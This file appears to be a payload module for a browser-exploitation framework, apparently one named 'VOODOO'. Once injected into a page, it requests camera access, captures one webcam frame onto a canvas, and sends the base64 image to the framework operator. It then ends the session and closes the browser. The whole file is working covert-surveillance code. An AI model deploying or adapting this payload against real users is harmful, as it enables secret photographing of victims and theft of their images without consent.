let height = 0;
let width = parseInt("%{size}") || 500;
const video = document.createElement('video');
const canvas = document.createElement('canvas');

document.body.appendChild(video);
document.body.appendChild(canvas);

async function takepicture() {
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, width, height);
    const data = canvas.toDataURL('image/jpeg');
    await VOODOO.send(data.split('base64,')[1]);
    await V.kill({ close_browser: true });
}

video.addEventListener('canplay', function () {
    height = video.videoHeight / (video.videoWidth / width);
    if (isNaN(height)) {
        height = width / (4 / 3);
    }
    canvas.width = width;
    canvas.height = height;
    video.setAttribute('width', width);
    video.setAttribute('height', height);
    canvas.setAttribute('width', width);
    canvas.setAttribute('height', height);
    setTimeout(takepicture, 100);
}, false);

navigator.mediaDevices.getUserMedia({
    video: true,
    audio: false
}).then(stream => {
    video.srcObject = stream;
    video.play();
}).catch(error => {
    V.log("[!] failed to access camera: " + error.message);
    V.kill();
});